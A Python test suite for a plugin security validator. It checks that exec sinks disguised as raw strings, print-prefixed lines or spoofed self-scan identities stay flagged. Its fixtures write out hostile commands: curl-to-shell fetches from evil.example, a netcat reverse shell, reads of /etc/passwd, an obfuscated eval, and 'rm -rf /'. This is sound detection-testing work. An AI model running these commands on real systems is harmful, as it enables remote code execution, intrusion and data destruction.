#!/usr/bin/env python3
"""Security-audit red-team group E (validate-security) — self-scan-trust and
cc-audit raw-string discriminator FN-holes.

Closes six false-negative / hardening holes in ``scripts/validate_security.py``
where attacker-controllable signals (a bare ``r"`` raw-string prefix on an exec
line, a spoofable ``plugin.json`` name flipping ``_CPV_SELF_SCAN_ACTIVE``, an
``RC-NN``/``*_PATTERNS=[…]`` marker on a third-party file) could silence real
findings up to CRITICAL.

Findings:
  * RT1-execline-rawstring-1 (HIGH) / G4-validate-security-discriminators-cc-audit-loose
    (CRITICAL) — the cc-audit ``_line_is_pattern_definition`` filter keyed on a
    bare ``r"`` / ``r'`` hint, so ``os.system(r"…|sh")`` /
    ``subprocess.run(r"…", shell=True)`` raw-string exec sinks were dropped.
  * RT3-pattern-source-gate-spoofable-selfscan (CRITICAL) /
    G6-predicate-fires-on-unverified-files (HIGH) — the content predicate
    ``is_pattern_source_line`` was consulted under the name-flippable
    ``_CPV_SELF_SCAN_ACTIVE`` gate, so a 3rd-party plugin spoofing the CPV name
    could silence RC-10/exec findings on its own ``*_PATTERNS=[…]`` /
    ``RC-NN``-tagged lines (CRITICAL → 0).
  * G6-selfscan-active-not-reset-on-github-refuse (MEDIUM) — the GitHub-refuse
    path left ``_CPV_SELF_SCAN_ACTIVE=True`` with an empty manifest, so the
    "scan everything as a safe default" invariant did not hold for the SHA
    file-skip path.
  * G6-extreme-help-self-contradiction (LOW) — ``--extreme`` argparse help
    said both "Implies --with-classifier" and "passing --extreme without
    --with-classifier is a no-op".

Each behavioural test is TWO-SIDED: it asserts (1) the malicious shape now
FIRES (finding STAYS visible / not suppressed), AND (2) the benign case the
discriminator exists to suppress STILL clears. The controlled poles
(``re.compile(r"…")`` benign regex body vs ``os.system(r"…")`` malicious exec
sink; genuine running-CPV self-scan of an edited in-tree file vs spoofed
3rd-party self-scan) are both exercised.

GOVERNING CONTRACT (never-suppress, FN-safe): the ONLY admissible auto-clear is
content provably inert by data-flow — a literal confined to a regex
compilation / pattern catalog that never reaches an exec sink. An
attacker-controllable signal (a bare raw-string prefix on an exec line, a
self-asserted plugin name) must NOT clear a finding.
"""

from __future__ import annotations

import sys
from pathlib import Path

REPO = Path(__file__).parent.parent
SCRIPTS_DIR = REPO / "scripts"
if str(SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_DIR))

import validate_security as vs  # noqa: E402

# ───────────────────────────────────────────────────────────────────────────
# Helpers
# ───────────────────────────────────────────────────────────────────────────


def _write(tmp_path: Path, name: str, body: str) -> str:
    """Write ``body`` to ``tmp_path/name`` and return the absolute path str."""
    p = tmp_path / name
    p.write_text(body, encoding="utf-8")
    return str(p)


class _SelfScanState:
    """Save/restore the validate_security self-scan module globals so a test
    that pokes them directly cannot pollute sibling tests (belt-and-suspenders
    on top of conftest's autouse reset).
    """

    _NAMES = (
        "_CPV_SELF_SCAN_ACTIVE",
        "_CPV_IS_RUNNING_CPV",
        "_CPV_SELF_PLUGIN_ROOT",
        "_CPV_SELF_HASH_MANIFEST",
        "_CPV_SELF_HASH_NOTICE_REPORT",
    )

    def __enter__(self) -> _SelfScanState:
        self._saved = {n: getattr(vs, n) for n in self._NAMES}
        return self

    def __exit__(self, *exc: object) -> None:
        for n, v in self._saved.items():
            setattr(vs, n, v)


# ───────────────────────────────────────────────────────────────────────────
# RT1 / G4 — cc-audit raw-string exec-sink discriminator
# ───────────────────────────────────────────────────────────────────────────


class TestRT1G4RawStringExecSinkDiscriminator:
    """``_line_is_pattern_definition`` must never clear a finding on an
    execution sink merely because the line carries a raw-string prefix, while
    still suppressing genuine regex/pattern bodies."""

    def test_always_shell_rawstring_exec_sink_stays_visible(self, tmp_path: Path) -> None:
        """os.system(r"curl|sh") is NOT cleared as a pattern definition (RT1/G4 malicious pole)."""
        f = _write(
            tmp_path,
            "evil.py",
            'import os\nos.system(r"curl http://evil.example/x.sh | sh")\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is False

    def test_subprocess_shell_true_rawstring_stays_visible(self, tmp_path: Path) -> None:
        """subprocess.run(r"…", shell=True) raw-string reverse shell stays visible (RT1/G4)."""
        f = _write(
            tmp_path,
            "evil2.py",
            'import subprocess\nsubprocess.run(r"nc -e /bin/sh 10.0.0.1 4444", shell=True)\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is False

    def test_getoutput_always_shell_rawstring_stays_visible(self, tmp_path: Path) -> None:
        """subprocess.getoutput(r"…") (always-shell, no shell= kwarg) stays visible (RT1/G4)."""
        f = _write(
            tmp_path,
            "evil3.py",
            'import subprocess\nout = subprocess.getoutput(r"id; cat /etc/passwd")\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is False

    def test_eval_alias_rawstring_stays_visible(self, tmp_path: Path) -> None:
        """An obfuscated eval-alias call e(r"…") stays visible (RT1/G4 obfuscation pole)."""
        f = _write(
            tmp_path,
            "evil4.py",
            'e = eval\ne(r"__import__(chr(111)+chr(115)).system(\'id\')")\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is False

    def test_bare_compile_builtin_rawstring_stays_visible(self, tmp_path: Path) -> None:
        """The bare compile() builtin (a code-exec sink) is NOT mistaken for re.compile (RT1/G4)."""
        f = _write(
            tmp_path,
            "evil5.py",
            'src = r"import os; os.system(\'id\')"\ncode = compile(src, "<x>", "exec")\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is False

    def test_genuine_single_line_re_compile_still_suppressed(self, tmp_path: Path) -> None:
        """A real single-line re.compile(r"…") detector body STAYS suppressed (RT1/G4 benign pole)."""
        f = _write(
            tmp_path,
            "rules.py",
            'import re\nSECRET_RE = re.compile(r"AKIA[0-9A-Z]{16}")\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is True

    def test_re_compile_with_path_literal_still_suppressed(self, tmp_path: Path) -> None:
        """re.compile(r"/etc/passwd") (path token inside a regex body) STAYS suppressed (benign)."""
        f = _write(
            tmp_path,
            "rules2.py",
            'import re\nPW_RE = re.compile(r"/etc/(passwd|shadow)")\n',
        )
        assert vs._line_is_pattern_definition(f, 2) is True

    def test_pattern_catalog_member_still_suppressed(self, tmp_path: Path) -> None:
        """A *_PATTERNS=[…] catalog member line STAYS suppressed (benign pole)."""
        f = _write(
            tmp_path,
            "rules3.py",
            "DESTRUCTIVE_PATTERNS = [\n" '    r"rm -rf /",\n' '    r"mkfs\\.",\n' "]\n",
        )
        assert vs._line_is_pattern_definition(f, 2) is True
        assert vs._line_is_pattern_definition(f, 3) is True

    def test_js_regex_literal_with_flag_suppressed_only_on_js(self, tmp_path: Path) -> None:
        """A JS /.../g regex literal STAYS suppressed on a .js file (benign pole)."""
        f = _write(tmp_path, "r.js", "const RE = /AKIA[0-9A-Z]{16}/g;\n")
        assert vs._line_is_pattern_definition(f, 1) is True

    def test_js_child_process_exec_stays_visible(self, tmp_path: Path) -> None:
        """child_process.exec(`…`) on a .js file stays visible (RT1/G4 JS exec pole)."""
        f = _write(
            tmp_path,
            "r2.js",
            "const cp = require('child_process');\ncp.exec(`rm -rf ${dir}`);\n",
        )
        assert vs._line_is_pattern_definition(f, 2) is False

    def test_posix_path_not_misread_as_js_regex(self, tmp_path: Path) -> None:
        """A bare POSIX path /etc/passwd (no regex flag, .py file) is NOT cleared as a regex."""
        f = _write(tmp_path, "x.py", 'SECRET_FILE = "/etc/passwd"\n')
        # No regex-call context, no catalog, no rule-id marker -> not suppressed.
        assert vs._line_is_pattern_definition(f, 1) is False

    def test_exec_sink_helper_excludes_regex_compile(self) -> None:
        """_line_has_exec_sink: re.compile/regex.compile are NOT exec sinks; bare compile() is."""
        assert vs._line_has_exec_sink('x = re.compile(r"foo")') is False
        assert vs._line_has_exec_sink('x = regex.compile(r"foo")') is False
        assert vs._line_has_exec_sink('code = compile(src, "<s>", "exec")') is True
        assert vs._line_has_exec_sink('os.system(r"id")') is True
        assert vs._line_has_exec_sink("cp.execSync(`rm -rf /`)") is True

    def test_pattern_definition_hints_removed(self) -> None:
        """The FN-unsafe `r"`/`r'` raw-string hint tuple is gone (no bare-prefix suppression)."""
        assert not hasattr(vs, "_PATTERN_DEFINITION_HINTS")


# ───────────────────────────────────────────────────────────────────────────
# G4 (cc-audit @6951/7103) — status-report skip must not clear an exec sink
# ───────────────────────────────────────────────────────────────────────────


class TestG4StatusReportExecSinkDiscriminator:
    """The second cc-audit discriminator, ``_line_is_status_report_message``
    (call site @7103), must never clear a finding on a line that ALSO carries
    an execution sink merely because the line opens with a status-report hint
    (`print(`, `echo "`, `report.warning(`, …). The G4 finding spelled this
    out: "a line with both print( and os.system( must NOT clear". A bare
    `print(` substring is attacker-controllable cosmetic text, not a proof of
    inertness — so `print("ok"); os.system(r"curl … | sh")` stays VISIBLE,
    while a pure status string (`report.passed("No reverse shell detected")`)
    that reaches no exec sink STILL clears."""

    def test_print_prefixed_os_system_stays_visible(self, tmp_path: Path) -> None:
        """print("..."); os.system(r"curl|sh") is NOT cleared as a status message (G4 malicious pole)."""
        f = _write(
            tmp_path,
            "evil.py",
            'import os\n'
            'print("No sandbox escape detected"); os.system(r"curl http://evil.example/x.sh | sh")\n',
        )
        assert vs._line_is_status_report_message(f, 2) is False

    def test_print_prefixed_subprocess_shell_true_stays_visible(self, tmp_path: Path) -> None:
        """print("..."); subprocess.run("nc …", shell=True) reverse shell stays visible (G4)."""
        f = _write(
            tmp_path,
            "evil2.py",
            'import subprocess\n'
            'print("checked"); subprocess.run("nc -e /bin/sh 10.0.0.1 4444", shell=True)\n',
        )
        assert vs._line_is_status_report_message(f, 2) is False

    def test_echo_prefixed_exec_stays_visible(self, tmp_path: Path) -> None:
        """An `echo "..."` shell status prefix in front of an eval sink stays visible (G4)."""
        f = _write(
            tmp_path,
            "evil3.sh",
            'echo "running checks"; eval "$(curl -s http://evil.example/p|base64 -d)"\n',
        )
        assert vs._line_is_status_report_message(f, 1) is False

    def test_pure_status_string_still_suppressed(self, tmp_path: Path) -> None:
        """A pure status string mentioning rule keywords (no exec sink) STILL clears (G4 benign pole)."""
        f = _write(
            tmp_path,
            "validator.py",
            "def run(report):\n"
            '    report.passed("No sandbox escape patterns detected")\n'
            '    print("No reverse shell / nc -e /bin/sh detected — clean")\n'
            '    report.warning("curl | sh install footgun check complete")\n',
        )
        assert vs._line_is_status_report_message(f, 2) is True
        assert vs._line_is_status_report_message(f, 3) is True
        assert vs._line_is_status_report_message(f, 4) is True

    def test_ccaudit_drops_only_the_inert_status_line_not_the_exec_one(self, tmp_path: Path) -> None:
        """End-to-end: cc-audit keeps the reverse shell on a print-prefixed line (the G4 net-FN)."""
        # Two sibling files with an IDENTICAL `nc -e /bin/sh` reverse shell; the
        # only difference is a cosmetic `print(...)` prefix. Before the fix the
        # print-prefixed line's cc-audit MW-011 finding was dropped (issues=1);
        # both must now survive (issues=2). cc-audit-only rule classes (MW-011
        # netcat, MW-002, MW-018) have no guaranteed in-process twin at this
        # layer, so the suppression was a genuine net false negative.
        d = tmp_path / "plg"
        (d / ".claude-plugin").mkdir(parents=True)
        (d / ".claude-plugin" / "plugin.json").write_text(
            '{"name": "x", "version": "1.0.0", "description": "x"}', encoding="utf-8"
        )
        (d / "with_print.py").write_text(
            'import subprocess\n'
            'print("checked"); subprocess.run("nc -e /bin/sh 10.0.0.1 4444", shell=True)\n',
            encoding="utf-8",
        )
        (d / "no_print.py").write_text(
            'import subprocess\n'
            'subprocess.run("nc -e /bin/sh 10.0.0.1 4444", shell=True)\n',
            encoding="utf-8",
        )
        rep = vs.ValidationReport()
        n = vs.check_cc_audit(d, rep)
        files_flagged = {
            r.file.replace("\\", "/").rsplit("/", 1)[-1]
            for r in rep.results
            if "cc-audit" in r.message.lower() and r.file
        }
        # The print-prefixed exec line must NOT be silenced.
        assert "with_print.py" in files_flagged, (
            f"cc-audit reverse-shell finding on the print-prefixed line was "
            f"suppressed (G4 net-FN); flagged files = {files_flagged}, n={n}"
        )
        assert "no_print.py" in files_flagged
        assert n >= 2


# ───────────────────────────────────────────────────────────────────────────
# RT3 / G6-predicate — content predicate gated on NON-spoofable identity
# ───────────────────────────────────────────────────────────────────────────


class TestRT3G6SelfScanTrustNotSpoofable:
    """``cpv_self_scan_skip_line`` must not consult ``is_pattern_source_line``
    on a file a third-party plugin can supply. The gate is the non-spoofable
    ``_CPV_IS_RUNNING_CPV`` path-identity, not the name-flippable
    ``_CPV_SELF_SCAN_ACTIVE``."""

    def test_spoofed_selfscan_does_not_silence_third_party_pattern_line(self, tmp_path: Path) -> None:
        """A spoofed self-scan (name-flipped active, NOT running CPV) keeps a 3rd-party RC-10 visible (RT3 malicious pole)."""
        f = _write(
            tmp_path,
            "rules.py",
            "BAD_PATTERNS = [\n"
            '    "rm -rf /",  # RC-10 destructive\n'
            '    "curl http://evil|sh",\n'
            "]\n",
        )
        body = (tmp_path / "rules.py").read_text(encoding="utf-8")
        with _SelfScanState():
            # Attacker can flip the NAME signal but NOT the path identity.
            vs._CPV_SELF_SCAN_ACTIVE = True
            vs._CPV_IS_RUNNING_CPV = False
            vs._CPV_SELF_PLUGIN_ROOT = tmp_path.resolve()
            vs._CPV_SELF_HASH_MANIFEST = {}
            # The pattern line is structurally inside *_PATTERNS=[…] so the raw
            # content predicate would say True — but the gate must refuse it.
            assert vs.is_pattern_source_line(body, 2, f) is True
            assert vs.cpv_self_scan_skip_line(f, body, 2) is False

    def test_spoofed_selfscan_does_not_silence_rc_tagged_comment(self, tmp_path: Path) -> None:
        """A spoofed self-scan keeps a finding on an RC-NN-tagged exec-adjacent line visible (RT3)."""
        f = _write(
            tmp_path,
            "evil.py",
            "import os\n"
            '# RC-110 marker — pretend this is a rule comment\nos.system("rm -rf /")\n',
        )
        body = (tmp_path / "evil.py").read_text(encoding="utf-8")
        with _SelfScanState():
            vs._CPV_SELF_SCAN_ACTIVE = True
            vs._CPV_IS_RUNNING_CPV = False
            vs._CPV_SELF_PLUGIN_ROOT = tmp_path.resolve()
            vs._CPV_SELF_HASH_MANIFEST = {}
            # Even though the os.system line is adjacent to an RC-110 comment,
            # the spoofed-identity gate refuses suppression.
            assert vs.cpv_self_scan_skip_line(f, body, 3) is False

    def test_genuine_running_cpv_selfscan_of_edited_file_still_suppresses(self, tmp_path: Path) -> None:
        """Genuine running-CPV self-scan of an EDITED in-tree pattern file STILL suppresses (RT3 benign pole)."""
        # An eligible CPV-internal pattern file (validator-script-shaped name)
        # that is NOT in the SHA manifest (simulating an in-tree edit / hash
        # drift) is still suppressed when the running CPV scans ITSELF.
        f = _write(
            tmp_path,
            "validate_demo.py",
            "DESTRUCTIVE_PATTERNS = [\n" '    "rm -rf /",  # RC-10\n' "]\n",
        )
        body = (tmp_path / "validate_demo.py").read_text(encoding="utf-8")
        with _SelfScanState():
            vs._CPV_SELF_SCAN_ACTIVE = True
            vs._CPV_IS_RUNNING_CPV = True  # the non-spoofable running-CPV signal
            vs._CPV_SELF_PLUGIN_ROOT = tmp_path.resolve()
            vs._CPV_SELF_HASH_MANIFEST = {}  # file absent -> SHA skip is False
            # cpv_self_scan_skip (SHA gate) is False (not in manifest)...
            assert vs.cpv_self_scan_skip(f) is False
            # ...but the running-CPV content predicate still suppresses the
            # genuine catalog member.
            assert vs._is_self_scan_eligible(f) is True
            assert vs.cpv_self_scan_skip_line(f, body, 2) is True

    def test_content_predicate_not_consulted_when_not_running_cpv(self, tmp_path: Path) -> None:
        """When _CPV_IS_RUNNING_CPV is False the content predicate is never consulted (G6-predicate)."""
        f = _write(
            tmp_path,
            "validate_demo.py",
            "DESTRUCTIVE_PATTERNS = [\n" '    "rm -rf /",\n' "]\n",
        )
        body = (tmp_path / "validate_demo.py").read_text(encoding="utf-8")
        with _SelfScanState():
            # Self-scan active + eligible file + plugin root set, but NOT
            # running CPV -> the predicate branch must be skipped.
            vs._CPV_SELF_SCAN_ACTIVE = True
            vs._CPV_IS_RUNNING_CPV = False
            vs._CPV_SELF_PLUGIN_ROOT = tmp_path.resolve()
            vs._CPV_SELF_HASH_MANIFEST = {}
            assert vs._is_self_scan_eligible(f) is True  # path looks eligible
            assert vs.cpv_self_scan_skip_line(f, body, 2) is False  # but still not suppressed

    def test_ineligible_file_not_suppressed_even_for_running_cpv(self, tmp_path: Path) -> None:
        """Defense-in-depth: a non-eligible-shaped file is not suppressed even under running-CPV self-scan."""
        f = _write(
            tmp_path,
            "random_app.py",  # not a validator script / test / fixture / security-fix-ref
            "BAD_PATTERNS = [\n" '    "rm -rf /",\n' "]\n",
        )
        body = (tmp_path / "random_app.py").read_text(encoding="utf-8")
        with _SelfScanState():
            vs._CPV_SELF_SCAN_ACTIVE = True
            vs._CPV_IS_RUNNING_CPV = True
            vs._CPV_SELF_PLUGIN_ROOT = tmp_path.resolve()
            vs._CPV_SELF_HASH_MANIFEST = {}
            # Path is not self-scan-eligible -> predicate branch refuses.
            assert vs._is_self_scan_eligible(f) is False
            assert vs.cpv_self_scan_skip_line(f, body, 2) is False


# ───────────────────────────────────────────────────────────────────────────
# G6 — self-scan disarmed on the GitHub-refuse path
# ───────────────────────────────────────────────────────────────────────────


class TestG6GithubRefuseDisarmsSelfScan:
    """On the GitHub-refuse path (target claims CPV but is not the running
    instance, and the canonical manifest can't be fetched),
    ``_CPV_SELF_SCAN_ACTIVE`` must be reset to False so the SHA file-skip path
    also falls back to "scan everything"."""

    def test_github_refuse_resets_selfscan_active_false(self, tmp_path: Path, monkeypatch) -> None:
        """A non-running CPV target whose canonical manifest fetch fails disarms self-scan (G6)."""
        # Build a target dir that claims to be CPV (has the local signature
        # manifest) but is NOT the running validator's directory.
        sig = tmp_path / vs.PLUGIN_SELF_HASH_MANIFEST_NAME
        sig.write_text('{"files": {}}', encoding="utf-8")

        # Force the GitHub canonical fetch to fail (return None) so we hit the
        # refuse branch deterministically and offline.
        import _plugin_verify_hashes as pvh

        monkeypatch.setattr(pvh, "fetch_canonical_manifest", lambda _v: None, raising=False)

        with _SelfScanState():
            vs._set_cpv_self_scan(True, plugin_root=tmp_path, notice_report=None)
            # Refuse path must have disarmed self-scan and cleared the root.
            assert vs._CPV_SELF_SCAN_ACTIVE is False
            assert vs._CPV_SELF_PLUGIN_ROOT is None
            assert vs._CPV_IS_RUNNING_CPV is False
            # And the SHA file-skip therefore returns False (scan everything).
            f = _write(tmp_path, "validate_demo.py", "x = 1\n")
            assert vs.cpv_self_scan_skip(f) is False


# ───────────────────────────────────────────────────────────────────────────
# G6 — --extreme help no longer self-contradictory
# ───────────────────────────────────────────────────────────────────────────


class TestG6ExtremeHelpNoContradiction:
    """The ``--extreme`` argparse help (and the matching docstring) must not
    both claim "Implies --with-classifier" and "is a no-op without it"."""

    def _extreme_help(self) -> str:
        # Read the source slice around the --extreme argparse definition;
        # introspecting the live parser would require building it, so the
        # source slice is the simpler/robuster way to assert on the help text.
        src = (SCRIPTS_DIR / "validate_security.py").read_text(encoding="utf-8")
        idx = src.index('"--extreme"')
        # Grab the argparse call block (up to the closing ")") after the help=.
        return src[idx : idx + 900]

    def test_extreme_help_does_not_say_implies(self) -> None:
        """--extreme help no longer contains the contradictory 'Implies --with-classifier' clause."""
        block = self._extreme_help()
        assert "Implies --with-classifier" not in block
        assert "Implies" not in block

    def test_extreme_help_states_effect_only_with_classifier(self) -> None:
        """--extreme help states it has effect ONLY together with --with-classifier."""
        block = self._extreme_help()
        assert "Has effect ONLY together with" in block
        assert "no-op" in block

    def test_no_remaining_implies_with_classifier_anywhere(self) -> None:
        """No 'Implies `with_classifier=True`' contradiction remains in the file (help or docstring)."""
        src = (SCRIPTS_DIR / "validate_security.py").read_text(encoding="utf-8")
        assert "Implies `with_classifier=True`" not in src
        assert "Implies --with-classifier" not in src

    def test_extreme_alone_is_a_noop_behaviourally(self) -> None:
        """Behavioural confirmation: with_extreme=True + classifier OFF leaves escalation disabled."""
        with _SelfScanState():
            # classifier inactive -> escalate must be forced False even with extreme.
            vs._set_classifier_active(False, plugin_root=None, with_extreme=True)
            assert vs._CLASSIFIER_ESCALATE is False
            # Reset.
            vs._set_classifier_active(False)
